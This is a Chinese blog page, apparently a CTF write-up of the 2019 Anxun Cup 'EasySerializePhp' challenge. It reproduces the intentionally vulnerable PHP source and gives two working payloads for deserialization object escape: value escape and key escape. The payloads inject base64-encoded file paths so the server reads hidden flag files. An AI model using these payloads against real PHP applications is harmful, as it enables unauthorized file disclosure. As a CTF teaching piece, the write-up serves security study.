@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>安洵杯:2019-EasySerializePhp - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content=" &amp;lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;p,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">安洵杯:2019-EasySerializePhp</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">安洵杯:2019-EasySerializePhp</h1>
+        <div class="stuff">
+            <span>七月 09, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>
+
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre>
+<p>提示在phpinfo中找东西</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span>phpinfo</code></pre>
+<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712021749634.png" alt="image-20210712021749634"></p>
+<p>那么现在就是要尝试读取这个文件</p>
+<p>题目是先序列化$_SESSION，然后再经过一个过滤函数，然后再反序列化，这样就产生了一个问题，过滤函数会替换掉一些关键词，这样就会造成反序列化的对象逃逸问题~~</p>
+<ul>
+<li>第一种为关键词数增加<br>例如： where-&gt;hacker，这样词数由五个增加到6个</li>
+<li>第二种为关键词数减少<br>例如：直接过滤掉一些关键词，例如这道题目中</li>
+<li>第一种情况比较好构造，直接构造多个关键词，这样就能逃出几个字符~~</li>
+<li>第二种可以是通过键逃逸和值逃逸~~</li>
+</ul>
+<p>$userinfo又是通过$serialize_info反序列化来的。</p>
+<p>$serialize_info又是通过session序列化之后再过滤得来的。</p>
+<h3 id="Payload1-值逃逸"><a href="#Payload1-值逃逸" class="headerlink" title="Payload1:值逃逸"></a>Payload1:值逃逸</h3><p>这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对~~</p>
+<pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>show_image</code></pre>
+<p>ZDBnM19mMWFnLnBocA==为d0g3_f1ag.php的base64编码</p>
+<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023548011.png" alt="image-20210712023548011"></p>
+<p>读取/d0g3_fllllllag：</p>
+<pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}&amp;function=show_image</code></pre>
+<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023457458.png" alt="image-20210712023457458"></p>
+<p>var_dump的结果为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token string">"a:3:{s:4:"</span>user<span class="token string">";s:24:"</span><span class="token string">";s:8:"</span><span class="token keyword">function</span><span class="token string">";s:59:"</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a<span class="token string">";}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"</code></pre>
+<h3 id="Payload2-键逃逸"><a href="#Payload2-键逃逸" class="headerlink" title="Payload2:键逃逸"></a>Payload2:键逃逸</h3><h3 id="这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对"><a href="#这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对" class="headerlink" title="这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~"></a>这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~</h3><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>flagphp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>var_dump的结果为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token string">"a:2:{s:7:"</span><span class="token string">";s:48:"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mbGxsbGxsYWc="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>Z3Vlc3RfaW1nLnBuZw<span class="token operator">==</span><span class="token string">";}"</span></code></pre>
+<p>这儿得s:7:””之所以为空，是因为我们构造得键flagphp都是会被过滤得，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去~~</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload1-%E5%80%BC%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Payload1:值逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload2-%E9%94%AE%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">Payload2:键逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E5%84%BF%E5%8F%AA%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E9%94%AE%E5%80%BC%E5%AF%B9%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E6%9E%84%E9%80%A0%E4%BC%9A%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E9%94%AE%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%80%BC%E5%BE%97%E4%B8%80%E9%83%A8%E5%88%86%E5%85%85%E5%BD%93%E9%94%AE%EF%BC%8C%E5%89%A9%E4%B8%8B%E5%BE%97%E4%B8%80%E9%83%A8%E5%88%86%E4%BD%9C%E4%B8%BA%E5%8D%95%E7%8B%AC%E5%BE%97%E9%94%AE%E5%80%BC%E5%AF%B9"><span class="toc-number">3.</span> <span class="toc-text">这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
